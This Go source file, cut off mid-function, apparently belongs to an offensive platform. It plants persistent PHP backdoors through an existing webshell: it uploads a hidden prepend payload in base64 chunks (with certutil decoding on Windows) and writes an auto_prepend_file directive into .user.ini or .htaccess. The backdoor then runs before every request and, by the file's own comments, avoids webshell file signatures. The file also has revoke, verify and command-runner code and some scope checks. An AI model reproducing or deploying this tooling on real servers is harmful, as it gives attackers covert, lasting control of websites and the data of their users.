package server

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"path"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/jingwei/db"
	"github.com/Autumn-27/jingwei/scanner"
	actool "github.com/Autumn-27/norma/tool"
)

// ---------------------------------------------------------------------------
// PHP 半持久化：把 v2 prepend 载荷放进 .user.ini / .htaccess，使 PHP 在每次
// 请求前自动加载它。载荷对普通请求静默放行，只响应带正确密钥的 v2 请求，
// 因此站点业务不受影响，而攻击链获得一个不落 webshell 文件特征的通道。
//
// 安全约定：
//   - 部署/撤销命令和台账 metadata 不包含密钥、载体或部署脚本；只保留路径、
//     token、构建号、SHA-256 和 webshell 关联。
//   - 目标回传的目录/临时目录先做严格校验，再拼进命令。
//   - 配置文件只追加带随机 token 的标记块；撤销只删除自己的块，不覆盖
//     目标原有内容。写入前若有他人的 auto_prepend_file 配置，需要 force。
//   - 新增的 webshell 记录 source=php_prepend，地址是触发 URL；删除父壳或
//     半持久化壳前必须先撤销对应落地物。
// ---------------------------------------------------------------------------

const (
	phpPersistDefaultWait = 8 * time.Second
	phpPersistMaxWait     = 120 * time.Second
	phpPersistChunkSize   = 1500 // base64 后约 2KB，远低于常见 8KB 头部限制

	phpPersistDirOK       = "__JW_PHP_DIR_OK__"
	phpPersistDirMissing  = "__JW_PHP_DIR_MISSING__"
	phpPersistConfigOK    = "__JW_PHP_CONFIG_OK__"
	phpPersistConfigFail  = "__JW_PHP_CONFIG_FAIL__"
	phpPersistConfigExist = "__JW_PHP_EXISTS__"
	phpPersistConfigHas   = "__JW_CFG_EXISTS__"
	phpPersistConfigMark  = "__JW_CFG_MARKER__"
	phpPersistConfigPre   = "__JW_CFG_PREPEND__"
)

var (
	rePHPPersistDir  = regexp.MustCompile(`^/[A-Za-z0-9 ._/+@%,:=-]*$`)
	rePHPPersistFile = regexp.MustCompile(`^\.[A-Za-z0-9][A-Za-z0-9._-]{0,48}\.php$`)
	rePHPPersistCfg  = regexp.MustCompile(`^\.[A-Za-z0-9._-]{1,64}$`)

	errPHPPersistParentNotFound = errors.New("webshell 不存在")
)

type phpPersistUserError struct{ msg string }

func (e phpPersistUserError) Error() string { return e.msg }

func phpPersistUserErr(format string, args ...any) error {
	return phpPersistUserError{msg: fmt.Sprintf(format, args...)}
}

type phpPersistInput struct {
	Mode        string `json:"mode"`
	Directory   string `json:"directory"`
	Filename    string `json:"filename"`
	ConfigName  string `json:"config_name"`
	TriggerURL  string `json:"trigger_url"`
	WaitSeconds int    `json:"wait_seconds"`
	Force       bool   `json:"force"`
	Name        string `json:"name"`
	Description string `json:"description"`
	TTLSeconds  int64  `json:"ttl_seconds"`
}

type phpPersistLayout struct {
	Mode          string
	OSKind        string
	Directory     string
	PayloadName   string
	PayloadPath   string
	ConfigName    string
	ConfigPath    string
	BlockPath     string
	TriggerURL    string
	Token         string
	BeginMarker   string
	EndMarker     string
	ConfigBlock   string
	TmpDir        string
	Build         string
	ConfigExisted bool
}

type phpPersistResult struct {
	Webshell    *db.Webshell         `json:"webshell,omitempty"`
	Artifact    *db.IntranetArtifact `json:"artifact,omitempty"`
	Mode        string               `json:"mode"`
	Directory   string               `json:"directory"`
	PayloadPath string               `json:"payload_path"`
	ConfigPath  string               `json:"config_path"`
	TriggerURL  string               `json:"trigger_url"`
	Info        scanner.ShellInfo    `json:"info"`
	Verified    bool                 `json:"verified"`
	Pending     bool                 `json:"pending"`
	CacheTTL    int                  `json:"user_ini_cache_ttl,omitempty"`
	Warnings    []string             `json:"warnings"`
	Note        string               `json:"note"`
}

// ---------------------------------------------------------------------------
// 参数校验与布局
// ---------------------------------------------------------------------------

func phpPersistUserINISupported(info scanner.ShellInfo) bool {
	name := strings.ToLower(strings.TrimSpace(info.UserINIFilename))
	if name == "" || name == "none" {
		return false
	}
	sapi := strings.ToLower(info.SAPI)
	return strings.Contains(sapi, "fpm") || strings.Contains(sapi, "cgi")
}

func phpPersistHtaccessSupported(info scanner.ShellInfo) bool {
	sapi := strings.ToLower(strings.TrimSpace(info.SAPI))
	server := strings.ToLower(info.ServerSoftware)
	if sapi == "apache2handler" {
		return true
	}
	return strings.Contains(server, "litespeed")
}

func phpPersistMode(raw string, info scanner.ShellInfo) (string, error) {
	mode := strings.ToLower(strings.TrimSpace(raw))
	switch mode {
	case "", "auto":
		if phpPersistUserINISupported(info) {
			return db.IntranetArtifactPHPUserINI, nil
		}
		if phpPersistHtaccessSupported(info) {
			return db.IntranetArtifactPHPHtaccess, nil
		}
		return "", phpPersistUserErr("当前 SAPI=%q、服务端=%q 既不支持 .user.ini，也无法确认 mod_php/LiteSpeed；请更换 PHP 运行方式或显式指定 mode", info.SAPI, info.ServerSoftware)
	case "user_ini", "user-ini", "userini":
		if !phpPersistUserINISupported(info) {
			return "", phpPersistUserErr(".user.ini 仅对 CGI/FastCGI SAPI 生效（当前 SAPI=%q，user_ini.filename=%q）", info.SAPI, info.UserINIFilename)
		}
		return db.IntranetArtifactPHPUserINI, nil
	case "htaccess", "ht":
		if !phpPersistHtaccessSupported(info) {
			return "", phpPersistUserErr(".htaccess 的 php_value 仅适用于 Apache mod_php 或 LiteSpeed（当前 SAPI=%q，服务端=%q）", info.SAPI, info.ServerSoftware)
		}
		return db.IntranetArtifactPHPHtaccess, nil
	}
	return "", phpPersistUserErr("mode 必须是 user_ini / htaccess / auto")
}

func phpPersistDirectory(raw, reported, osKind string) (string, error) {
	dir := strings.TrimSpace(raw)
	if dir == "" {
		dir = strings.TrimSpace(reported)
	}
	if dir == "" {
		return "", phpPersistUserErr("无法确定目标目录：webshell 未返回 __DIR__，请显式提供 directory")
	}
	if osKind == intranetOSWindows {
		_, normalized, ok := intranetWindowsPath(dir)
		if !ok {
			return "", phpPersistUserErr("Windows 目录必须是盘符绝对路径，且不能包含引号、%% 或通配符")
		}
		normalized = strings.TrimRight(normalized, `\`)
		if len(normalized) < 4 {
			return "", phpPersistUserErr("不允许把半持久化配置写到盘符根目录，请指定网站子目录")
		}
		return normalized, nil
	}
	clean := path.Clean(dir)
	if clean == "/" || !rePHPPersistDir.MatchString(clean) {
		return "", phpPersistUserErr("目录必须是绝对路径，仅允许字母、数字、空格和 ._/+@%%,:=-（不允许引号、通配符、换行）")
	}
	return clean, nil
}

func phpPersistTriggerURL(raw, parentURL string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		raw = strings.TrimSpace(parentURL)
	}
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" || (u.Scheme != "http" && u.Scheme != "https") {
		return "", phpPersistUserErr("trigger_url 必须是有效的 http(s) 地址")
	}
	if u.User != nil {
		return "", phpPersistUserErr("trigger_url 不能包含用户名/口令")
	}
	pu, err := url.Parse(strings.TrimSpace(parentURL))
	if err != nil || !strings.EqualFold(u.Host, pu.Host) || !strings.EqualFold(u.Scheme, pu.Scheme) {
		return "", phpPersistUserErr("trigger_url 必须与父 webshell 同协议、同主机和端口（%s://%s）", pu.Scheme, pu.Host)
	}
	return u.String(), nil
}

func phpPersistFilename(raw, token string) (string, error) {
	name := strings.TrimSpace(raw)
	if name == "" {
		name = ".jw" + token + ".php"
	}
	if !rePHPPersistFile.MatchString(name) || strings.Contains(name, "..") {
		return "", phpPersistUserErr("filename 必须是隐藏的 .php 文件名（以点开头，仅含字母数字 ._-，例如 .jw1a2b3c4d.php）")
	}
	return name, nil
}

func phpPersistConfigName(raw, mode string, info scanner.ShellInfo) (string, error) {
	name := strings.TrimSpace(raw)
	if name == "" {
		if mode == db.IntranetArtifactPHPUserINI {
			if reported := strings.TrimSpace(info.UserINIFilename); reported != "" && !strings.EqualFold(reported, "none") {
				name = reported
			}
			if name == "" {
				name = ".user.ini"
			}
		} else {
			name = ".htaccess"
		}
	}
	if !rePHPPersistCfg.MatchString(name) || strings.Contains(name, "..") {
		return "", phpPersistUserErr("config_name 必须是当前目录下的隐藏配置文件名（如 .user.ini / .htaccess）")
	}
	return name, nil
}

func phpPersistJoin(dir, name, osKind string) string {
	if osKind == intranetOSWindows {
		return dir + `\` + name
	}
	return dir + "/" + name
}

func phpPersistConfigBlock(mode, begin, end, payloadPath string) string {
	directive := "auto_prepend_file = "
	if mode == db.IntranetArtifactPHPHtaccess {
		directive = "php_value auto_prepend_file "
	}
	target := strings.ReplaceAll(payloadPath, `\`, `/`)
	return "\n" + begin + "\n" + directive + `"` + target + `"` + "\n" + end + "\n"
}

// ---------------------------------------------------------------------------
// 目标侧命令
// ---------------------------------------------------------------------------

func phpPersistDirCheckCommand(layout phpPersistLayout) string {
	if layout.OSKind == intranetOSWindows {
		script := `if (Test-Path -LiteralPath '` + layout.Directory + `' -PathType Container) { '` +
			phpPersistDirOK + `' } else { '` + phpPersistDirMissing + `' }`
		return `"` + intranetWindowsPowerShellPath() + `" -NoProfile -NonInteractive -Command "` + script + `"`
	}
	return "if [ -d " + shQuote(layout.Directory) + " ]; then echo " + phpPersistDirOK + "; else echo " + phpPersistDirMissing + "; fi"
}

func phpPersistInspectCommand(layout phpPersistLayout) string {
	cfg := layout.ConfigPath
	if layout.OSKind == intranetOSWindows {
		q, _, _ := intranetWindowsPath(cfg)
		return `if exist ` + q + ` (echo ` + phpPersistConfigHas +
			` & findstr /C:"` + layout.BeginMarker + `" ` + q + ` >nul 2>&1 && echo ` + phpPersistConfigMark +
			` & findstr /C:"auto_prepend_file" ` + q + ` >nul 2>&1 && echo ` + phpPersistConfigPre +
			`) else (echo ` + phpPersistDirMissing + `)`
	}
	q := shQuote(cfg)
	return "if [ -f " + q + " ]; then echo " + phpPersistConfigHas + "; grep -qF " + shQuote(layout.BeginMarker) + " " + q +
		" && echo " + phpPersistConfigMark + "; grep -qF auto_prepend_file " + q + " && echo " + phpPersistConfigPre +
		"; else echo " + phpPersistDirMissing + "; fi"
}

func phpPersistAppendCommand(layout phpPersistLayout) string {
	block := layout.BlockPath
	if layout.OSKind == intranetOSWindows {
		qb, _, _ := intranetWindowsPath(block)
		qc, _, _ := intranetWindowsPath(layout.ConfigPath)
		return `type ` + qb + `>>` + qc + ` && echo ` + phpPersistConfigOK + ` || echo ` + phpPersistConfigFail
	}
	qb, qc := shQuote(block), shQuote(layout.ConfigPath)
	return "if [ -f " + qc + " ] && grep -qF " + shQuote(layout.BeginMarker) + " " + qc +
		"; then echo " + phpPersistConfigExist +
		"; elif cat " + qb + " >> " + qc + "; then echo " + phpPersistConfigOK +
		"; else echo " + phpPersistConfigFail + "; fi"
}

func phpPersistSidecarPaths(layout phpPersistLayout) []string {
	if strings.TrimSpace(layout.TmpDir) == "" || strings.TrimSpace(layout.Build) == "" {
		return nil
	}
	if layout.OSKind == intranetOSWindows {
		_, tmp, ok := intranetWindowsPath(layout.TmpDir)
		if !ok {
			return nil
		}
		tmp = strings.TrimRight(tmp, `\`)
		out := []string{}
		for _, ext := range []string{".r", ".k"} {
			if _, p, ok := intranetWindowsPath(tmp + `\.` + layout.Build + ext); ok {
				out = append(out, p)
			}
		}
		return out
	}
	tmp := path.Clean(strings.TrimSpace(layout.TmpDir))
	if tmp == "/" || !rePHPPersistDir.MatchString(tmp) {
		return nil
	}
	return []string{tmp + "/." + layout.Build + ".r", tmp + "/." + layout.Build + ".k"}
}

func phpPersistCleanupFiles(layout phpPersistLayout) []string {
	return append([]string{layout.PayloadPath, layout.BlockPath}, phpPersistSidecarPaths(layout)...)
}

func phpPersistRevokeCommand(layout phpPersistLayout) string {
	if layout.OSKind == intranetOSWindows {
		return phpPersistRevokeWindows(layout)
	}
	cfg := shQuote(layout.ConfigPath)
	parts := []string{
		"if [ -f " + cfg + " ]; then awk -v b=" + shQuote(layout.BeginMarker) + " -v e=" + shQuote(layout.EndMarker) +
			` '$0==b{s=1;next} $0==e{s=0;next} !s{print}' ` + cfg + " > " + cfg + ".jwrev && mv -f " + cfg + ".jwrev " + cfg + "; fi",
	}
	if !layout.ConfigExisted {
		parts = append(parts, "if [ -f "+cfg+" ] && ! grep -q '[^[:space:]]' "+cfg+" 2>/dev/null; then rm -f "+cfg+"; fi")
	}
	quoted := make([]string, 0, len(phpPersistCleanupFiles(layout)))
	for _, p := range phpPersistCleanupFiles(layout) {
		quoted = append(quoted, shQuote(p))
	}
	parts = append(parts, "rm -f "+strings.Join(quoted, " "))
	parts = append(parts, "echo "+intranetArtifactOK)
	return strings.Join(parts, "; ")
}

func phpPersistRevokeWindows(layout phpPersistLayout) string {
	qc, _, _ := intranetWindowsPath(layout.ConfigPath)
	bq := strings.ReplaceAll(layout.BeginMarker, `'`, `''`)
	eq := strings.ReplaceAll(layout.EndMarker, `'`, `''`)
	script := `$c=` + qc + `; $b='` + bq + `'; $e='` + eq + `'; ` +
		`if (Test-Path -LiteralPath $c) { $lines=[IO.File]::ReadAllLines($c); $out=New-Object System.Collections.Generic.List[string]; $s=$false; ` +
		`foreach ($l in $lines) { $t=$l.Trim(); if ($t -eq $b) { $s=$true; continue }; if ($t -eq $e) { $s=$false; continue }; if (-not $s) { $out.Add($l) } }; ` +
		`[IO.File]::WriteAllLines($c, $out.ToArray(), (New-Object System.Text.UTF8Encoding($false))) }; `
	if !layout.ConfigExisted {
		script += `if (Test-Path -LiteralPath $c) { if (([IO.File]::ReadAllText($c)).Trim().Length -eq 0) { Remove-Item -LiteralPath $c -Force -ErrorAction SilentlyContinue } }; `
	}
	for _, p := range phpPersistCleanupFiles(layout) {
		q, _, ok := intranetWindowsPath(p)
		if !ok {
			continue
		}
		script += `Remove-Item -LiteralPath ` + q + ` -Force -ErrorAction SilentlyContinue; `
	}
	script += `'` + intranetArtifactOK + `'`
	return `"` + intranetWindowsPowerShellPath() + `" -NoProfile -NonInteractive -Command "` + script + `"`
}

func phpPersistVerifyCommand(layout phpPersistLayout) string {
	if layout.OSKind == intranetOSWindows {
		qc, _, _ := intranetWindowsPath(layout.ConfigPath)
		qp, _, _ := intranetWindowsPath(layout.PayloadPath)
		marker := strings.ReplaceAll(layout.BeginMarker, `'`, `''`)
		script := `$p=$false; if (Test-Path -LiteralPath ` + qc + `) { $t=[IO.File]::ReadAllText(` + qc +
			`); if ($t.Contains('` + marker + `')) { $p=$true } }; if (Test-Path -LiteralPath ` + qp +
			`) { $p=$true }; if ($p) { '` + intranetArtifactPresent + `' } else { '` + intranetArtifactGone + `' }`
		return `"` + intranetWindowsPowerShellPath() + `" -NoProfile -NonInteractive -Command "` + script + `"`
	}
	cfg, payload := shQuote(layout.ConfigPath), shQuote(layout.PayloadPath)
	return "p=0; if [ -f " + cfg + " ] && grep -qF " + shQuote(layout.BeginMarker) + " " + cfg + "; then p=1; fi; " +
		"if [ -f " + payload + " ]; then p=1; fi; " +
		"if [ \"$p\" = \"1\" ]; then echo " + intranetArtifactPresent + "; else echo " + intranetArtifactGone + "; fi"
}

// ---------------------------------------------------------------------------
// 分块上传（父壳的载体可能是 HTTP 头，单块必须远小于头部上限）
// ---------------------------------------------------------------------------

func phpPersistUpload(run intranetCommandRunner, layout phpPersistLayout, target string, content []byte) error {
	if len(content) == 0 {
		return errors.New("载荷内容为空")
	}
	if layout.OSKind == intranetOSWindows {
		return phpPersistUploadWindows(run, target, content)
	}
	return phpPersistUploadPOSIX(run, target, content)
}

func phpPersistUploadPOSIX(run intranetCommandRunner, target string, content []byte) error {
	for offset := 0; offset < len(content); offset += phpPersistChunkSize {
		end := offset + phpPersistChunkSize
		if end > len(content) {
			end = len(content)
		}
		op := ">>"
		if offset == 0 {
			op = ">"
		}
		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
		cmd := "printf '%s' '" + chunk + "' | base64 -d " + op + " " + shQuote(target)
		out := run(cmd, 30*time.Second)
		if out.IsError {
			return fmt.Errorf("写入第 %d 块失败: %s", offset/phpPersistChunkSize+1, strings.TrimSpace(out.Note+out.Output))
		}
	}
	out := run("wc -c < "+shQuote(target), 20*time.Second)
	got, err := strconv.ParseInt(strings.TrimSpace(out.Output), 10, 64)
	if out.IsError || err != nil || got != int64(len(content)) {
		return fmt.Errorf("写入后大小不符（期望 %d，实际 %q）", len(content), strings.TrimSpace(out.Output))
	}
	return nil
}

func phpPersistUploadWindows(run intranetCommandRunner, target string, content []byte) error {
	_, normalized, ok := intranetWindowsPath(target)
	if !ok {
		return errors.New("Windows 目标路径无效")
	}
	qTarget, _, _ := intranetWindowsPath(normalized)
	suffix := ".jw" + strconv.FormatInt(time.Now().UnixNano(), 10)
	qB64, _, ok1 := intranetWindowsPath(normalized + suffix + ".b64")
	_, binPath, ok2 := intranetWindowsPath(normalized + suffix + ".bin")
	qBin, _, _ := intranetWindowsPath(binPath)
	if !ok1 || !ok2 {
		return errors.New("无法构造 Windows 临时文件路径")
	}
	cleanup := func() {
		run("del /f /q "+qB64+" "+qBin+" >nul 2>&1", 10*time.Second)
	}
	for offset := 0; offset < len(content); offset += phpPersistChunkSize {
		end := offset + phpPersistChunkSize
		if end > len(content) {
			end = len(content)
		}
		op := ">>"
		if offset == 0 {
			op = ">"
		}
		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
		out := run("echo "+chunk+op+qB64, 30*time.Second)
		if out.IsError {
			cleanup()
			return fmt.Errorf("写入第 %d 块失败: %s", offset/phpPersistChunkSize+1, strings.TrimSpace(out.Note+out.Output))
		}
	}
	out := run("certutil -decode -f "+qB64+" "+qBin, 30*time.Second)
	if out.IsError {
		cleanup()
		return errors.New("certutil 解码失败: " + strings.TrimSpace(out.Note+out.Output))
	}
	sizeOut := run(intranetWindowsSizeCmd(qBin), 20*time.Second)
	got, _ := strconv.ParseInt(strings.TrimSpace(sizeOut.Output), 10, 64)
	if sizeOut.IsError || got != int64(len(content)) {
		cleanup()
		return fmt.Errorf("解码后大小不符（期望 %d，实际 %q）", len(content), strings.TrimSpace(sizeOut.Output))
	}
	moved := run("move /y "+qBin+" "+qTarget, 20*time.Second)
	if moved.IsError {
		cleanup()
		return errors.New("覆盖目标文件失败: " + strings.TrimSpace(moved.Note+moved.Output))
	}
	cleanup()
	return nil
}

// ---------------------------------------------------------------------------
// 运行器
// ---------------------------------------------------------------------------

// directWebshellRunner executes one command through a managed webshell without
// an intranet session. It is the cleanup path for artifacts whose session is
// gone but whose parent webshell is still alive. probe 会先 ping 一次：台账里的
// webshell 可能早就不在了（半持久化的意义正是父壳文件被删），不探测就会选中死
// 通道，把本来能完成的撤销判成失败。
func (s *Server) directWebshellRunner(ctx context.Context, shell *db.Webshell, probe bool) (intranetCommandRunner, error) {
	if shell == nil || strings.TrimSpace(shell.URL) == "" {
		return nil, errors.New("webshell 没有可用地址")
	}
	payload, err := s.shellPayloadFor(shell)
	if err != nil {
		return nil, err
	}
	if probe {
		cctx, cancel := context.WithTimeout(ctx, 12*time.Second)
		defer cancel()
		if alive, note := scanner.CheckShellAlive(cctx, scanner.NewDeepClient(10*time.Second), shell.URL, payload); !alive {
			return nil, fmt.Errorf("webshell #%d 不可用：%s", shell.ID, note)
		}
	}
	return func(command string, timeout time.Duration) intranetExecOutcome {
		out := intranetExecOutcome{ExitCode: -1}
		if strings.TrimSpace(command) == "" {
			out.IsError, out.Note = true, "命令不能为空"
			return out
		}
		if timeout <= 0 {
			timeout = intranetExecTimeout
		}
		cctx, cancel := context.WithTimeout(ctx, timeout+5*time.Second)
		defer cancel()
		client := scanner.NewDeepClient(timeout)
		raw, rerr := scanner.RunShellCommand(cctx, client, shell.URL, payload, command)
		out.Output = raw
		if rerr != nil {
			out.IsError = true
			out.Note = rerr.Error()
		}
		return out
	}, nil
}

func intranetArtifactMetaID(v any) int64 {
	switch t := v.(type) {
	case float64:
		return int64(t)
	case float32:
		return int64(t)
	case int64:
		return t
	case int:
		return int64(t)
	case json.Number:
		n, _ := t.Int64()
		return n
	case string:
		n, _ := strconv.ParseInt(strings.TrimSpace(t), 10, 64)
		return n
	}
	return 0
}

// intranetArtifactChannel 是台账落地物的一条执行通道。Self 表示这条通道正是该
// 落地物自身（prepend 壳）：撤销成功后它立刻失效，复核必须在同一次执行里完成。
type intranetArtifactChannel struct {
	Run  intranetCommandRunner
	Self bool
}

// intranetArtifactRunner picks the best available execution path for an
// artifact: an explicit/bound session first, then the webshell recorded in
// metadata. PHP prepend artifacts are deployed from a webshell and usually have
// no session, so the fallback is what lets TTL cleanup and evacuation revoke
// them without operator input.
func (s *Server) intranetArtifactRunner(ctx context.Context, pg *db.DB, art *db.IntranetArtifact, sessionID int64) (*intranetArtifactChannel, error) {
	fromSession := func(id int64) (intranetCommandRunner, bool) {
		if id <= 0 {
			return nil, false
		}
		sess, err := pg.GetIntranetSession(id)
		if err != nil {
			return nil, false
		}
		return func(command string, timeout time.Duration) intranetExecOutcome {
			return s.intranetRun(ctx, pg, sess, command, timeout)
		}, true
	}
	if run, ok := fromSession(sessionID); ok {
		return &intranetArtifactChannel{Run: run}, nil
	}
	if art.SessionID != nil {
		if run, ok := fromSession(*art.SessionID); ok {
			return &intranetArtifactChannel{Run: run}, nil
		}
	}
	ownID := intranetArtifactMetaID(art.Metadata["webshell_id"])
	selfPrepend := art.Kind == db.IntranetArtifactPHPUserINI || art.Kind == db.IntranetArtifactPHPHtaccess
	keys := []string{"webshell_id", "parent_webshell_id"}
	if selfPrepend {
		// 半持久化落地物撤销的正是 prepend 壳自己：优先走与 prepend 无关的父壳，
		// 那样撤销后仍能用同一条通道复核；父壳已失效时才退回 prepend 壳。
		keys = []string{"parent_webshell_id", "webshell_id"}
	}
	for _, key := range keys {
		id := intranetArtifactMetaID(art.Metadata[key])
		if id <= 0 {
			continue
		}
		shell, err := pg.GetWebshell(id)
		if err != nil || strings.TrimSpace(shell.URL) == "" {
			continue
		}
		if _, allowed := shellAllowed(pg, shell.URL); !allowed {
			continue
		}
		run, err := s.directWebshellRunner(ctx, shell, true)
		if err != nil {
			continue
		}
		return &intranetArtifactChannel{Run: run, Self: selfPrepend && id == ownID}, nil
	}
	return nil, errors.New("落地物没有可用会话或 webshell，无法执行；请提供 session_id 或先恢复关联 webshell")
}

// ---------------------------------------------------------------------------
// 部署编排
// ---------------------------------------------------------------------------

func phpPersistWaitDuration(seconds int, mode string) time.Duration {
	wait := phpPersistDefaultWait
	if mode == db.IntranetArtifactPHPHtaccess {
		wait = 3 * time.Second
	}
	if seconds > 0 {
		wait = time.Duration(seconds) * time.Second
	}
	if wait > phpPersistMaxWait {
		wait = phpPersistMaxWait
	}
	return wait
}

func phpPersistHTTPStatus(ctx context.Context, rawURL string) int {
	client := scanner.NewDeepClient(15 * time.Second)
	resp := client.Do(ctx, scanner.DeepRequest{
		Method:  http.MethodGet,
		URL:     rawURL,
		Headers: map[string]string{"Cache-Control": "no-cache", "Pragma": "no-cache"},
	})
	if resp.Error != "" {
		return 0
	}
	return resp.StatusCode
}

func (s *Server) phpPersistProbe(ctx context.Context, trigger string, payload scanner.ShellPayload, wait time.Duration) (bool, string) {
	deadline := time.Now().Add(wait)
	last := ""
	client := scanner.NewDeepClient(15 * time.Second)
	for {
		alive, note := scanner.CheckShellAlive(ctx, client, trigger, payload)
		if alive {
			return true, note
		}
		last = note
		if time.Now().After(deadline) {
			return false, last
		}
		select {
		case <-ctx.Done():
			return false, ctx.Err().Error()
		case <-time.After(2 * time.Second):
		}
	}
}

func (s *Server) deployPHPSemiPersist(ctx context.Context, pg *db.DB, parentID int64, in phpPersistInput) (*phpPersistResult, error) {
	parent, err := pg.GetWebshell(parentID)
	if err != nil {
		return nil, errPHPPersistParentNotFound
	}
	if !strings.EqualFold(parent.Protocol, scanner.ShellProtocolV2) || !strings.EqualFold(parent.ShellType, "php") {
		return nil, phpPersistUserErr("父 webshell 必须是 PHP 加密 v2 载荷（当前 %s/%s）；请先重新投放最新 PHP v2 webshell", parent.ShellType, parent.Protocol)
	}
	if strings.EqualFold(parent.Source, "php_prepend") {
		return nil, phpPersistUserErr("不能从半持久化 shell 再次部署：它自身就依赖 auto_prepend_file，覆盖配置会破坏已有通道")
	}
	if strings.TrimSpace(parent.URL) == "" {
		return nil, phpPersistUserErr("父 webshell 没有可用地址")
	}
	if reason, allowed := shellAllowed(pg, parent.URL); !allowed {
		return nil, phpPersistUserErr("父 webshell 地址命中资产拦截规则：%s", reason)
	}
	parentPayload, err := s.shellPayloadFor(parent)
	if err != nil {
		return nil, phpPersistUserErr("无法还原父 webshell 载荷：%v", err)
	}
	taskID := int64(0)
	if parent.TaskID != nil {
		taskID = *parent.TaskID
	}
	if taskID <= 0 {
		taskID = intranetCtxTaskID(ctx)
	}
	host := intranetHost(parent.URL)
	if reason, allowed := s.intranetTargetAllowed(pg, taskID, host); !allowed {
		return nil, phpPersistUserErr("%s", reason)
	}
	expiresAt, err := intranetArtifactExpiry(in.TTLSeconds)
	if err != nil {
		return nil, phpPersistUserErr("%v", err)
	}

	client := scanner.NewDeepClient(30 * time.Second)
	info, err := scanner.QueryShellInfo(ctx, client, parent.URL, parentPayload)
	if err != nil {
		return nil, phpPersistUserErr("读取目标 PHP 运行时信息失败：%v。请确认父 webshell 已重新投放为最新 v2 载荷", err)
	}
	osKind := intranetOSPosix
	if info.Windows() {
		osKind = intranetOSWindows
	}
	mode, err := phpPersistMode(in.Mode, info)
	if err != nil {
		return nil, err
	}
	directory, err := phpPersistDirectory(in.Directory, info.Dir, osKind)
	if err != nil {
		return nil, err
	}
	triggerURL, err := phpPersistTriggerURL(in.TriggerURL, parent.URL)
	if err != nil {
		return nil, err
	}
	if reason, allowed := shellAllowed(pg, triggerURL); !allowed {
		return nil, phpPersistUserErr("trigger_url 命中资产拦截规则：%s", reason)
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return nil, err
	}
	filename, err := phpPersistFilename(in.Filename, token)
	if err != nil {
		return nil, err
	}
	configName, err := phpPersistConfigName(in.ConfigName, mode, info)
	if err != nil {
		return nil, err
	}
	if tu, terr := url.Parse(triggerURL); terr == nil && strings.EqualFold(path.Base(tu.Path), filename) {
		return nil, phpPersistUserErr("trigger_url 不能指向将要上传的 prepend 载荷本身；请使用同目录下的正常 PHP 脚本或父 webshell 地址")
	}
	payloadPath := phpPersistJoin(directory, filename, osKind)
	configPath := phpPersistJoin(directory, configName, osKind)
	blockName := ".jwblk" + token + ".tmp"
	blockPath := phpPersistJoin(directory, blockName, osKind)
	if osKind == intranetOSWindows {
		for _, p := range []string{payloadPath, configPath, blockPath} {
			if _, _, ok := intranetWindowsPath(p); !ok {
				return nil, phpPersistUserErr("目标路径包含 Windows 不允许的字符或长度异常：%s", p)
			}
		}
	}

	kind := mode
	fp := intranetArtifactFingerprint(kind, host, configPath, triggerURL, "", "", "")
	if existing, ferr := pg.FindActiveIntranetArtifactByFingerprint(fp); ferr == nil {
		return nil, phpPersistUserErr("目标位置已有活跃的半持久化落地物 #%d（%s）；请先撤销后再部署", existing.ID, configPath)
	} else if !errors.Is(ferr, db.ErrIntranetArtifactNotFound) {
		return nil, ferr
	}

	warnings := []string{}
	if strings.TrimSpace(info.AutoPrependFile) != "" {
		if !in.Force {
			return nil, phpPersistUserErr("目标当前已设置 auto_prepend_file=%q，继续部署会覆盖它；确认覆盖请传 force=true", truncateText(info.AutoPrependFile, 200))
		}
		warnings = append(warnings, "目标原有 auto_prepend_file 将被本次配置覆盖："+truncateText(info.AutoPrependFile, 200))
	}

	layout := phpPersistLayout{
		Mode: mode, OSKind: osKind, Directory: directory,
		PayloadName: filename, PayloadPath: payloadPath,
		ConfigName: configName, ConfigPath: configPath, BlockPath: blockPath,
		TriggerURL: triggerURL, Token: token,
		TmpDir: info.TmpDir,
	}
	layout.BeginMarker = phpPersistMarker(mode, token, true)
	layout.EndMarker = phpPersistMarker(mode, token, false)
	layout.ConfigBlock = phpPersistConfigBlock(mode, layout.BeginMarker, layout.EndMarker, payloadPath)

	runner, err := s.directWebshellRunner(ctx, parent, false)
	if err != nil {
		return nil, phpPersistUserErr("无法通过父 webshell 执行命令：%v", err)
	}

	dirOut := runner(phpPersistDirCheckCommand(layout), 20*time.Second)
	if !strings.Contains(dirOut.Output, phpPersistDirOK) {
		return nil, phpPersistUserErr("目标目录不存在或不可访问：%s（%s）", directory, strings.TrimSpace(displayOr(dirOut.Note, dirOut.Output)))
	}

	configExisted, hasMarker, hasPrepend := phpPersistInspect(runner, layout)
	layout.ConfigExisted = configExisted
	if hasMarker {
		return nil, phpPersistUserErr("配置 %s 中已存在半持久化标记，可能已在别处部署；请先清理对应落地物", configPath)
	}
	if hasPrepend && !in.Force {
		return nil, phpPersistUserErr("配置 %s 已包含 auto_prepend_file 设置，继续会覆盖现有 prepend；确认覆盖请传 force=true", configPath)
	}
	if hasPrepend && in.Force {
		warnings = append(warnings, "目标配置文件已有 auto_prepend_file 设置，本次部署会覆盖它")
	}

	baseline := phpPersistHTTPStatus(ctx, triggerURL)
	switch {
	case baseline == 0:
		warnings = append(warnings, "部署前基线请求失败，无法用站点状态对比发现 prepend 引起的 5xx")
	case baseline >= 500:
		warnings = append(warnings, fmt.Sprintf("部署前站点已返回 HTTP %d，健康对比可能不准确", baseline))
	}

	key, err := scanner.GenerateShellKey()
	if err != nil {
		return nil, err
	}
	carrier, err := scanner.GenerateShellCarrier()
	if err != nil {
		return nil, err
	}
	payload, err := scanner.BuildPHPSemiPersistPayloadV2(key, carrier)
	if err != nil {
		return nil, err
	}
	layout.Build = payload.Build

	if err := phpPersistUpload(runner, layout, layout.PayloadPath, []byte(payload.Content)); err != nil {
		phpPersistRemove(runner, layout, layout.PayloadPath)
		return nil, fmt.Errorf("上传 prepend 载荷失败：%w", err)
	}
	if err := phpPersistUpload(runner, layout, layout.BlockPath, []byte(layout.ConfigBlock)); err != nil {
		phpPersistRemove(runner, layout, layout.PayloadPath, layout.BlockPath)
		return nil, fmt.Errorf("上传配置块失败：%w", err)
	}

